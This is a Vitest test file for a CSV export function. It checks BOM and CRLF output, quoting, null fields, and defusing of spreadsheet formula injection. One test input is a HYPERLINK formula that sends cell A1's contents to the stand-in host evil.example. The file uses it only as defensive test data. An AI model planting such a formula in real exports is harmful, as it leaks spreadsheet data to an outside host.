import { describe, expect, it } from "vitest";
import { toCsv } from "./csv";

const BOM = "﻿";
const columns = ["Name", "Note", "Score"] as const;
type Row = Record<(typeof columns)[number], string | number | null>;

const lines = (csv: string) => csv.slice(BOM.length).split("\r\n");

describe("toCsv", () => {
  it("starts with a UTF-8 BOM and uses CRLF line endings", () => {
    const csv = toCsv(columns, [{ Name: "José", Note: "ok", Score: 1 }]);
    expect(csv.startsWith(BOM)).toBe(true);
    expect(csv).toBe(`${BOM}Name,Note,Score\r\nJosé,ok,1\r\n`);
    expect(csv.replace(/\r\n/g, "")).not.toMatch(/[\r\n]/);
  });

  it("quotes fields with commas, quotes, CR or LF and doubles embedded quotes", () => {
    const rows: Row[] = [
      { Name: "Doe, Jane", Note: 'Said "hi"', Score: null },
      { Name: "Line\nbreak", Note: "Carriage\rreturn", Score: 2 },
    ];
    expect(toCsv(columns, rows)).toBe(
      `${BOM}Name,Note,Score\r\n"Doe, Jane","Said ""hi""",\r\n"Line\nbreak","Carriage\rreturn",2\r\n`,
    );
  });

  it("writes null as an empty field", () => {
    expect(lines(toCsv(columns, [{ Name: null, Note: null, Score: null }]))[1]).toBe(",,");
  });

  it("neutralizes formula-looking strings but leaves numbers and phone numbers alone", () => {
    const csv = toCsv(columns, [
      { Name: '=HYPERLINK("http://evil.example/?x="&A1,"Click")', Note: "-5", Score: -5 },
      { Name: "@SUM(A1:A2)", Note: "+44 20 7946 0000", Score: 0 },
      { Name: "\t=1+1", Note: "plain", Score: 3.5 },
    ]);
    expect(lines(csv).slice(1, 4)).toEqual([
      `"'=HYPERLINK(""http://evil.example/?x=""&A1,""Click"")",-5,-5`,
      `'@SUM(A1:A2),+44 20 7946 0000,0`,
      `'\t=1+1,plain,3.5`,
    ]);
  });
});
